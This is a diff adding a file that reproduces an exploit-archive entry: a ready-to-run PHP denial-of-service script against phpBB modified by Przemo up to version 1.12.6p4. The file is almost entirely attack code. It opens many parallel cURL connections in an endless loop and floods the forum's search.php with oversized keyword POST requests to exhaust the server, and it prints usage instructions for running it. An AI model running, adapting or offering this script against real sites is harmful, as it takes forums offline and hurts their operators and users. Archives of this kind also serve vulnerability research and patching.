@@ -1,0 +1,99 @@
+id: 12061
+date: 04/29/2010
+title: phpBB modified by Przemo <= 1.12.6p4 Denial Of Service Exploit
+author: GLOBUS
+cves: 
+
+==============================================================
+phpBB modified by Przemo <= 1.12.6p4 Denial Of Service Exploit
+==============================================================
+
+<?php
+################################################################################
+# Exploit Title:         phpBB modified by Przemo <= 1.12.6p4 Denial Of Service Exploit1
+#
+# Software               phpBB modified by Przemo 1.12.6p4
+# Date:                  2010-04-29
+# Author:                GLOBUS
+# Software Link:         http://www.przemo.org/phpBB2/
+# Version:               <= 1.12.6p4
+# category:              DoS
+#
+# Greetz:                hds, Neo, pok3, .xXx., j4ck, revel004, Kopaczka
+################################################################################
+// cURL and PHP5
+
+function info()
+{
+	echo "##################################################################\n";
+	echo "# phpBB modified by Przemo <= 1.12.6p4 Denial Of Service Exploit1\n";
+	echo "# Author: GLOBUS\n";
+	echo "# Greetz: hds, Neo, pok3, .xXx., j4ck, revel004, Kopaczka\n";
+	echo "##################################################################\n";
+	echo "# php dos.php URL THREADS TIMEOUT\n";
+	echo "# php dos.php http://www.example.pl/phpbb/ 20 5\n";
+	echo "##################################################################\n";
+	exit;
+}
+
+if($argc !== 4 || !preg_match('#^\d+$#', $argv[2]) || !preg_match('#^\d+$#', $argv[3]))
+{
+	info();
+}
+
+$url = $argv[1];
+$threads = (int) $argv[2];
+$timeout = (int) $argv[3];
+
+$ptimeout = $timeout * 100;
+
+$packet = implode('+', range(100,999));
+
+while(1)
+{
+	$m = curl_multi_init();
+
+	for($i = 0; $i < $threads; $i++)
+	{
+		$c[$i] = curl_init();
+		$opts = array
+		(
+			CURLOPT_URL		=> $url . 'search.php?mode=results',
+			CURLOPT_USERAGENT	=> 'Opera/9.80 (Windows NT 5.1; U; pl) Presto/2.5.24 Version/10.52',
+			CURLOPT_ENCODING	=> 'gzip, deflate',
+			CURLOPT_POST		=> 1,
+			CURLOPT_POSTFIELDS	=> 'search_keywords='. $packet .'&search_terms=all&search_author=&search_time=0&search_fields=all&show_results=posts&sort_by=2&sort_dir=DESC&return_chars=-1',
+			CURLOPT_RETURNTRANSFER	=> 1,
+			CURLOPT_TIMEOUT		=> $timeout,
+		);
+		curl_setopt_array($c[$i], $opts);
+		curl_multi_add_handle($m, $c[$i]);
+	}
+
+	$t = 0;
+	do
+	{
+		curl_multi_exec($m, $r);
+		usleep(100000);
+
+		$t++;
+
+		if($t > $ptimeout)
+		{
+			curl_multi_close($m);
+			for($i = 0; $i < $threads; $i++)
+			{
+				curl_close($c[$i]);
+			}
+			break;
+		}
+	}
+	while($r > 0);
+
+	echo '.';
+}
+?>
+
+
+
+#  0day.today [2023-03-25]  #
